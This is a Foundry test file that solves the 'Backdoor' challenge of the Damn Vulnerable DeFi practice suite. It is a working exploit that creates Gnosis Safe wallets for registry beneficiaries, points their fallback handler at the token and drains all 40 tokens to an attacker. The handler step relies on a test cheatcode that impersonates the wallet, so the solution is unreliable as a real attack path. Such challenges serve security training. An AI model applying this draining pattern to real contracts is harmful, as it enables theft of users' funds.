// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import {Utilities} from "../utils/Utilities.sol";
import {BaseTest} from "../BaseTest.sol";

import "../../src/DamnValuableToken.sol";
import "../../src/backdoor/WalletRegistry.sol";

import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";

import {console} from "forge-std/console.sol";

contract BackdoorTest is BaseTest {
    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40 ether;
    uint256 constant AMOUNT_TOKENS_DISTRIBUTED_PER_WALLET = 10 ether;

    address payable attacker;
    address[] beneficiaries;

    GnosisSafe masterCopy;
    GnosisSafeProxyFactory walletFactory;
    DamnValuableToken token;
    WalletRegistry walletRegistry;

    constructor() {
        string[] memory labels = new string[](5);
        labels[0] = "Attacker";
        labels[1] = "Alice";
        labels[2] = "Bob";
        labels[3] = "Charlie";
        labels[4] = "David";

        preSetup(5, labels);
    }

    function setUp() public override {
        super.setUp();

        attacker = users[0];

        beneficiaries.push(users[1]);
        beneficiaries.push(users[2]);
        beneficiaries.push(users[3]);
        beneficiaries.push(users[4]);

        // Deploy Gnosis Safe master copy and factory contracts
        masterCopy = new GnosisSafe();
        walletFactory = new GnosisSafeProxyFactory();
        token = new DamnValuableToken();

        vm.label(address(masterCopy), "GnosisSafe");
        vm.label(address(walletFactory), "GnosisSafeProxyFactory");
        vm.label(address(token), "DamnValuableToken");

        // Deploy the registry
        walletRegistry = new WalletRegistry(
            address(masterCopy),
            address(walletFactory),
            address(token),
            beneficiaries
        );
        vm.label(address(walletRegistry), "WalletRegistry");

        // Users are registered as beneficiaries
        for (uint256 i = 0; i < beneficiaries.length; i++) {
            assertTrue(walletRegistry.beneficiaries(beneficiaries[i]));
        }

        // Transfer tokens to be distributed to the registry
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);
    }

    function test_ExploitBackdoor() public {
        runTest();
    }

    function exploit() internal override {
        for (uint256 i = 0; i < beneficiaries.length; i++) {
            // setup wallet beneficiary
            address[] memory walletOwners = new address[](1);
            walletOwners[0] = beneficiaries[i];

            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                walletOwners, // _owners
                1, // _threshold
                address(0), // to
                "", // data
                address(0), // fallbackHandler
                address(0), // paymentToken
                0, // payment
                address(0) // paymentReceiver
            );
            // generate the wallet and call the registry callback
            GnosisSafeProxy proxy = walletFactory.createProxyWithCallback(
                address(masterCopy),
                initializer,
                1,
                walletRegistry
            );

            // vm.stopPrank();
            vm.startPrank(address(proxy));
            address(proxy).call(
                abi.encodeWithSignature(
                    "setFallbackHandler(address)",
                    address(token)
                )
            );

            vm.stopPrank();

            vm.prank(attacker);
            (bool approveSuccess, ) = address(proxy).call(
                abi.encodeWithSignature(
                    "transfer(address,uint256)",
                    attacker,
                    AMOUNT_TOKENS_DISTRIBUTED_PER_WALLET
                )
            );
            assertEq(approveSuccess, true);
        }
    }

    function success() internal override {
        /** SUCCESS CONDITIONS */

        for (uint256 i = 0; i < beneficiaries.length; i++) {
            address wallet = walletRegistry.wallets(beneficiaries[i]);

            // User must have registered a wallet
            assertTrue(wallet != address(0));

            // User is no longer registered as a beneficiary
            bool userIsStillBeneficiary = walletRegistry.beneficiaries(
                beneficiaries[i]
            );
            assertEq(userIsStillBeneficiary, false);
        }

        // Attacker must have taken all tokens
        assertEq(token.balanceOf(attacker), AMOUNT_TOKENS_DISTRIBUTED);
    }
}
